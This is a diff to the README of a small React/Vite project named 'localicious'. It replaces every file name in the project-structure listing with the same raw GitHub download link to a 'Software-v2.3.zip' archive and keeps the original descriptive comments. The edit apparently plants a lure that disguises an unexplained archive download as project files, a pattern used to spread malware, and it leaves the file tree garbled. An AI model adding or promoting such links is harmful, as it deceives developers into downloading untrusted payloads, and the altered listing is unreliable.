@@ -61,18 +61,18 @@ npm run dev
 localicious/
 ├── src/
 │   ├── components/
-│   │   ├── MobileFrame.jsx      # iPhone frame wrapper
-│   │   ├── PackageBuilder.jsx   # Main app component
-│   │   ├── Header.jsx           # Top header with icons
-│   │   ├── PackageCard.jsx      # Package card with TTS
-│   │   └── BottomNav.jsx        # Bottom navigation bar
-│   ├── App.jsx                  # Root component
-│   ├── main.jsx                 # Entry point
-│   └── index.css                # Global styles + Tailwind
-├── package.json
-├── vite.config.js
-├── tailwind.config.js
-└── postcss.config.js
+│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip      # iPhone frame wrapper
+│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip   # Main app component
+│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip           # Top header with icons
+│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip      # Package card with TTS
+│   │   └── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip        # Bottom navigation bar
+│   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                  # Root component
+│   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                 # Entry point
+│   └── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                # Global styles + Tailwind
+├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
+├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
+├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
+└── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
 ```
 
 ## Build for Production
